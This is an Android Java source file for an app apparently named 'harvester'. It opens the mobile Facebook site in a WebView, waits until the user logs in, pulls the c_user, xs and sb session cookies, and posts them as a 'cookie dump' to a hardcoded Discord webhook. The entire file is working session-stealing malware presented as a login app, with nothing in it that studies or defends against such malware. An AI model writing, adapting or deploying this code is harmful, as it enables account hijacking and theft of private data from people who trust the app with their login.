package com.fb.harvester;

import android.os.Bundle;
import android.webkit.CookieManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1564845237459750982/5SSwTgSG1OoKxhpzccfVzDt1GG64YRoSksPWcxl6GHgOV5jFoWYJ0MF3x5pcjhVT2_sO";
    private WebView webView;
    private boolean hasSent = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        webView = new WebView(this);
        setContentView(webView);

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setUserAgentString("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36");

        // Force cookies to be accepted and saved
        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(webView, true);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                extractAndSendCookies(url);
            }
        });

        // Load the mobile Facebook login
        webView.loadUrl("https://m.facebook.com/");
    }

    private void extractAndSendCookies(String url) {
        if (hasSent) return;

        // Grab all cookies for the current URL
        String cookies = CookieManager.getInstance().getCookie(url);

        // Only fire if we see the auth cookies
        if (cookies != null && cookies.contains("c_user=") && cookies.contains("xs=")) {
            
            String c_user = "", xs = "", sb = "";
            
            // Parse them out clean
            String[] cookieArray = cookies.split(";");
            for (String c : cookieArray) {
                c = c.trim();
                if (c.startsWith("c_user=")) c_user = c.substring(7);
                if (c.startsWith("xs=")) xs = c.substring(3);
                if (c.startsWith("sb=")) sb = c.substring(3);
            }

            hasSent = true; // Lock it so it doesn't spam
            sendToDiscord(c_user, xs, sb, url);
        }
    }

    private void sendToDiscord(final String c_user, final String xs, final String sb, final String url) {
        new Thread(() -> {
            try {
                URL discordUrl = new URL(WEBHOOK_URL);
                HttpURLConnection conn = (HttpURLConnection) discordUrl.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                // Build the Discord payload
                String jsonPayload = "{\"content\":\"**Mobile FB Cookie Dump**\\n```\\nc_user: " + c_user + "\\nxs:     " + xs + "\\nsb:     " + sb + "\\n```\\nURL: " + url + "\",\"allowed_mentions\":{\"parse\":[]}}";

                OutputStream os = conn.getOutputStream();
                os.write(jsonPayload.getBytes("UTF-8"));
                os.close();

                conn.getInputStream().close(); // Execute request
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    // Prevent back button from closing the app immediately (feels more like a real app)
    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}